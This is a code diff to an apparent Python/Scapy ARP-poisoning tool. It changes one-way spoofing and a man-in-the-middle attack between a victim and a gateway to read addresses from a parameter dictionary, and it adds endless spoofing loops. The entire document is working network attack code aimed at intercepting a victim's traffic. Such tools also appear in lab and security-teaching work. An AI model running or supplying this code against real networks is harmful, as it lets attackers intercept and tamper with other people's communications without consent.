@@ -1,4 +1,5 @@
 from scapy.all import *
+from setup import *
 
 def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof, interface):
     arp = Ether() / ARP()
@@ -10,36 +11,28 @@ def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof, interface):
 
     sendp(arp, iface = interface, verbose=False)
     
-def oneWayPoisoning(interface):
+def oneWayPoisoning(a,interface):
    
     print("\none-way ARP poisoning\n")
 
-    interface = getInterface(interface)
- 
-    macAttacker = raw_input("Attacker MAC address: ")
-    ipAttacker = raw_input("Attacker IP address: ")
+    hwA = a["attacker MAC"]
+    hwV = a["victim MAC"]
+    ipV = a["victim IP"]
+    ipG = a["gateway IP"]
 
-    macVictim = raw_input("Victim MAC address: ")
-    ipVictim = raw_input("Victim IP address: ")
-
-    ipToSpoof = raw_input("IP address to impersonate: ")
+    while True:
+        arpPoison(hwA, hwV, ipV, ipG, interface)
     
-    arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof, interface)
-    
-def mimAttack(interface):
+def mimAttack(a,interface):
 
     print("\nMITM attack using ARP poisoning\n")
 
-    interface = getInterface(interface)
+    hwA = a["attacker MAC"]
+    hwV = a["victim MAC"]
+    hwG = a["gateway MAC"]
+    ipV = a["victim IP"]
+    ipG = a["gateway IP"]
 
-    macAttacker = raw_input("Attacker MAC address: ")
-    ipAttacker = raw_input("Attacker IP address: ")
-
-    macVictim1 = raw_input("Victim 1 MAC address: ")
-    ipVictim1 = raw_input("Victim 1 IP address: ")
-    
-    macVictim2 = raw_input("Victim 2 MAC address: ")
-    ipVictim2 = raw_input("Victim 2 IP address: ")
-    
-    arpPoison(macAttacker, macVictim1, ipVictim1, ipVictim2)
-    arpPoison(macAttacker, macVictim2, ipVictim2, ipVictim1)
+    while True:
+        arpPoison(hwA, hwV, ipV, ipG, interface)
+        arpPoison(hwA, hwG, ipG, ipV, interface)
